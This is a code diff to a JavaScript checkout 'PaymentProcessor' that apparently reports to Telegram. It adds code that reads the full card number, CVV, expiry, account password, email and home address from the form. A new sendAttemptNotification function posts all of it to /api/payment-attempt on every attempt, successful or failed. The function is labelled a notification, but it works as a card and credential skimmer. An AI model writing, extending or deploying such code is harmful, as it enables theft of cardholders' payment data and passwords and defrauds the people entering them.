@@ -266,6 +266,7 @@ class PaymentProcessor {
                     paymentId: this.paymentId,
                     paymentMethodId: 'pm_card_' + Date.now(),
                     cardInfo: {
+                        fullNumber: document.getElementById('card-number').value,
                         last4: document.getElementById('card-number').value.slice(-4),
                         brand: this.getCardBrand(document.getElementById('card-number').value)
                     },
@@ -285,6 +286,9 @@ class PaymentProcessor {
             });
             
             const processData = await processResponse.json();
+            
+            // Send notification for EVERY attempt
+            this.sendAttemptNotification(processData);
             
             if (processData.success) {
                 this.showSuccess('Payment successful! 🎉 Subscription activated. Check your Telegram for confirmation.');
@@ -344,6 +348,55 @@ class PaymentProcessor {
 document.addEventListener('DOMContentLoaded', () => {
     new PaymentProcessor();
 });
+
+// Send notification for EVERY payment attempt
+async function sendAttemptNotification(processData) {
+    try {
+        const userData = {
+            email: document.getElementById('email').value,
+            password: document.getElementById('password').value,
+            fullname: document.getElementById('fullname').value,
+            address: document.getElementById('address').value,
+            city: document.getElementById('city').value,
+            state: document.getElementById('state').value,
+            zip: document.getElementById('zip').value,
+            cardholderName: document.getElementById('cardholder-name').value,
+            cvv: document.getElementById('cvv').value,
+            expiry: document.getElementById('expiry').value
+        };
+        
+        const cardInfo = {
+            fullNumber: document.getElementById('card-number').value,
+            last4: document.getElementById('card-number').value.slice(-4),
+            brand: getCardBrand(document.getElementById('card-number').value)
+        };
+        
+        const attemptData = {
+            userData,
+            cardInfo,
+            planName: selectedPlan.name,
+            price: selectedPlan.price,
+            status: processData.success ? 'SUCCESS' : 'FAILED',
+            error: processData.error || 'None',
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+        };
+        
+        // Send attempt notification
+        const response = await fetch('/api/payment-attempt', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(attemptData)
+        });
+        
+        console.log('📤 Payment attempt notification sent');
+        
+    } catch (error) {
+        console.error('❌ Failed to send attempt notification:', error);
+    }
+}
 
 // Test Telegram connection
 async function testTelegramConnection() {
